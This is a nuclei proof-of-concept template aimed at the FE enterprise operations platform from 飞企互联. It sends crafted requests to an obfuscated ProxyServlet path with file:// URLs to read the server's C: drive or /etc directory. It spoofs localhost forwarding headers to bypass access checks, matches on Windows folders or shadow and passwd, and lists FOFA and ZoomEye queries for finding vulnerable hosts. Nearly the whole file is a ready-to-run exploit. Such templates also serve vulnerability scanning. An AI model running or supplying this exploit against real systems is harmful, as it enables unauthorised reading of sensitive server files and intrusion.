content:
# Add your nuclei formatted PoC!
id: fe-ProxyServletUtil-fileread
 
info:
  name: 飞企互联-FE企业运营管理平台-proxyservletutil-文件读取
  author: rain
  severity: critical
  metadata:
    fofa: app="飞企互联-FE企业运营管理平台" || body="fe-font.css" || app="FE-协作平台"
    Zoomeye: 'iconhash: "e90223165de1b1c7ae95336f10c3fe5d"'
 
requests:
  - raw:
      - |
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        X-Forwarded-For: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        Accept-Language: zh-CN,zh;q=0.9
 
    attack: batteringram
    payloads:
      path:
        - '/ProxyServletUti%6c?url=file:///c:'
        - '/ProxyServletUti%6c?url=file:///etc'
    stop-at-first-match: true
    matchers:
      - type: dsl
        condition: or
        dsl:
          - "contains(body,'Program Files') && contains(body,'Windows')"
          - "contains(body,'shadow') && contains(body,'passwd')"
help: 飞企互联-FE企业运营管理平台-proxyservletutil-文件读取
